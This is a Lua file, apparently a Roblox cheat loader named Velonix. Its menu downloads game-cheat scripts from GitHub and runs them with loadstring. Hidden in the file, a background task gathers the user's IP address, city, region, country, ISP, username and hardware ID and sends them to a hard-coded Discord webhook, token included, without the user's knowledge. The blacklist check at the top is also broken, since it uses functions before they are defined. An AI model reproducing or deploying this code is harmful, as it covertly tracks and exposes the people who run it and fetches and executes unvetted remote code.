local blacklist = {
    ["HWID_HERE"] = true
    }
if blacklist[getHWID()] then
    player:Kick("Blacklisted.")
    return
end

-- // Velonix Script Loader v3 - © itzC9
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- CONFIG
local WEBHOOK_URL = "https://discord.com/api/webhooks/1393398739812487189/D8MlZ7oGZ70VwMX045sIHBDmWUmBEvtBDDqJe97pJBfaSFZgQA2zRllrJKs-b8GOqXO9"
local IP_API_URL = "https://velonix-api.vercel.app/json"

-- [[ GUI Setup ]]
local screenGui = Instance.new("ScreenGui", playerGui)
screenGui.Name = "VelonixLoader"
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 300, 0, 320)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -150)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel", mainFrame)
title.Size = UDim2.new(1, -40, 0, 40)
title.Position = UDim2.new(0, 10, 0, 0)
title.Text = "Velonix Script Loader"
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextColor3 = Color3.new(1,1,1)
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left

local closeBtn = Instance.new("TextButton", mainFrame)
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -35, 0, 5)
closeBtn.Text = "X"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 16
closeBtn.TextColor3 = Color3.new(1,1,1)
closeBtn.BackgroundColor3 = Color3.fromRGB(255,60,60)
closeBtn.BorderSizePixel = 0
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
closeBtn.MouseButton1Click:Connect(function()
	screenGui:Destroy()
end)

-- [[ Script Buttons Section ]]
local scrollFrame = Instance.new("ScrollingFrame", mainFrame)
scrollFrame.Size = UDim2.new(1, -40, 1, -60)
scrollFrame.Position = UDim2.new(0, 20, 0, 50)
scrollFrame.BackgroundTransparency = 1
scrollFrame.ScrollBarThickness = 6
scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
scrollFrame.ClipsDescendants = true
Instance.new("UIPadding", scrollFrame).PaddingBottom = UDim.new(0, 10)

local layout = Instance.new("UIListLayout", scrollFrame)
layout.Padding = UDim.new(0, 10)
layout.SortOrder = Enum.SortOrder.LayoutOrder

-- [[ Script List ]]
local LOADER_SCRIPTS = {
	["🌱 Grow a Garden"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/GAG.lua",
	["⚔️ The Strongest Battleground"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/TSB.lua",
	["🗡️ Steal a Sword"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/SAS.lua",
	["🔨 Flee The Facility"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/FTF.lua",
	["🌐 Universal Script"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/UNIV.lua"
}

local function addScriptButton(name, url)
	local btn = Instance.new("TextButton", scrollFrame)
	btn.Size = UDim2.new(1, 0, 0, 40)
	btn.Text = name
	btn.Font = Enum.Font.Gotham
	btn.TextSize = 16
	btn.TextColor3 = url and Color3.new(1,1,1) or Color3.fromRGB(170,170,170)
	btn.BackgroundColor3 = Color3.fromRGB(40,40,40)
	btn.BorderSizePixel = 0
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
	btn.Active = url ~= nil
	btn.MouseButton1Click:Connect(function()
		if not url then
			warn(name .. " is coming soon!")
			return
		end
		local ok, err = pcall(function()
			local script = game:HttpGet(url, true)
			assert(script and #script > 10, "Invalid script response")
			loadstring(script)()
		end)
		if not ok then
			warn("Error loading '"..name.."':", err)
		else
			mainFrame.Visible = false
		end
	end)
end

for displayName, url in pairs(LOADER_SCRIPTS) do
	addScriptButton(displayName, url)
end

-- [[ HWID Function ]]
local function getHWID()
	return (gethwid and gethwid())
		or (getgenv and getgenv().hwid)
		or (identifyexecutor and tostring(identifyexecutor()):gsub("%W", ""))
		or game:GetService("RbxAnalyticsService"):GetClientId()
end

-- [[ Execution Logging ]]
task.spawn(function()
	local ok, ipData = pcall(function() return game:HttpGet(IP_API_URL, true) end)
	if not ok or not ipData then
		warn("IP lookup failed")
		return
	end

	local ipInfo = HttpService:JSONDecode(ipData)
	local hwid = getHWID()
	local executor =
		(identifyexecutor and identifyexecutor())
		or (getexecutor and getexecutor())
		or (syn and "Synapse")
		or "Unknown"

	local gameName = "Unknown"
	pcall(function()
		gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
	end)

	local payload = {
		username = "🔥 | Developer",
		embeds = {{
			title = "🚨 New Script Execution",
			description = string.format(
				"**👤 Username:** `%s`\n**💻 Executor:** `%s`\n**🆔 HWID:** `%s`\n**🎮 Game:** `%s` (%d)\n\n**🌐 IP:** `%s`\n**🏳️ Country:** `%s`\n**📍 Region:** `%s`\n**🏙️ City:** `%s`\n**📶 ISP:** `%s`",
				player.Name,
				executor,
				hwid,
				gameName, game.PlaceId,
				ipInfo.ip or "N/A",
				ipInfo.country or "N/A",
				ipInfo.region or "N/A",
				ipInfo.city or "N/A",
				ipInfo.org or "N/A"
			),
			color = 15158332,
			footer = { text = "Velonix Loader • "..os.date("%Y-%m-%d %H:%M:%S") },
			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
		}}
	}

	local requestFunc = (syn and syn.request) or (http and http.request) or request
	if requestFunc then
		local okReq, res = pcall(function()
			return requestFunc({
				Url = WEBHOOK_URL,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = HttpService:JSONEncode(payload)
			})
		end)
		if not okReq or not res.Success then
			warn("api failed")
		end
	end
end)